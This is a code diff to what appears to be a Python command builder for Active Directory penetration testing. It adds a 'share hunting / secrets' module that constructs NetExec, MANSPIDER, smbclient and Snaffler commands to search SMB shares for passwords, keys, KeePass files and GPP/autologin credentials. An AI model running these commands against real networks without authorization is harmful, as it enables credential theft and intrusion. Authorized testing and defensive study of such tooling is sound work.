@@ -475,6 +475,26 @@ def b_goldenpac(ctx):  # MS14-068
     return cmd("impacket-goldenPac", auth, h, k, dcip_flag(ctx))
 
 
+# --- Share hunting / secrets ---
+def b_nxc_shares(ctx): return _nxc("smb", ctx, "--shares")
+def b_nxc_spider_secrets(ctx):
+    return _nxc("smb", ctx, "-M spider_plus -o DOWNLOAD_FLAG=true",
+                "PATTERN=passw,secret,cred,unattend,.kdbx,.config,id_rsa,.ppk,.ps1,.bak")
+def b_manspider_content(ctx):
+    return cmd("manspider", ctx["target"], "-u", _q(ctx["user"]), "-p", _q(ctx["password"]),
+               "-d", _q(ctx["domain"]), "--content -e txt,xml,ini,config,conf,ps1,bat,cmd,yml,kdbx,xlsx,docx --threads 50")
+def b_manspider_names(ctx):
+    return cmd("manspider", ctx["target"], "-u", _q(ctx["user"]), "-p", _q(ctx["password"]),
+               "-d", _q(ctx["domain"]), "-f", pv(ctx, "pattern", "passw cred secret unattend"))
+def b_smbclient_spider(ctx):
+    share = pv(ctx, "share", "C$")
+    auth = _q(f"{ctx['domain']}\\{ctx['user']}%{ctx['password']}")
+    return cmd("smbclient", f"//{ctx['target']}/{share}", "-U", auth, "-c", _q("recurse ON; ls"))
+def b_snaffler(ctx):
+    return "Snaffler.exe -s -o snaffler.log   # run on a domain-joined Windows host"
+def b_nxc_secrets_module(ctx): return _nxc("smb", ctx, "-M gpp_password -M gpp_autologin")
+
+
 # ---------------------------------------------------------------------------
 # catalog
 # ---------------------------------------------------------------------------
@@ -766,6 +786,24 @@ ACTIONS = [
          desc="Accounts/computers trusted for delegation.", build=b_nxc_unconstrained, requires=["user"]),
     dict(id="nxc_admincount", cat="Enumeration", label="nxc adminCount=1",
          desc="Protected / privileged accounts.", build=b_nxc_admincount, requires=["user"]),
+
+    # --- Share hunting / secrets ---
+    dict(id="nxc_shares", cat="Share hunting", label="List shares",
+         desc="Readable/writable shares on the target.", build=b_nxc_shares, requires=["user"]),
+    dict(id="nxc_spider_secrets", cat="Share hunting", label="Spider shares for secrets",
+         desc="spider_plus, download files matching secret patterns.", build=b_nxc_spider_secrets, requires=["user"]),
+    dict(id="manspider_content", cat="Share hunting", label="MANSPIDER (content)",
+         desc="Search file CONTENT across shares for secrets.", build=b_manspider_content, requires=["user"]),
+    dict(id="manspider_names", cat="Share hunting", label="MANSPIDER (filenames)",
+         desc="Search by filename pattern across shares.", build=b_manspider_names,
+         inputs=[T("pattern", "Filename keywords", "passw cred secret", "passw cred secret unattend")], requires=["user"]),
+    dict(id="smbclient_spider", cat="Share hunting", label="smbclient recurse",
+         desc="Recursively list a share with smbclient.", build=b_smbclient_spider,
+         inputs=[T("share", "Share", "C$", "C$")], requires=["user"]),
+    dict(id="nxc_secrets_module", cat="Share hunting", label="GPP / autologin secrets",
+         desc="Pull cpassword + autologin creds from SYSVOL.", build=b_nxc_secrets_module, requires=["user"]),
+    dict(id="snaffler", cat="Share hunting", label="Snaffler (note)",
+         desc="Best-in-class share secret finder (run on a Windows host).", build=b_snaffler, requires=[]),
 ]
 
 ACTIONS_BY_ID = {a["id"]: a for a in ACTIONS}
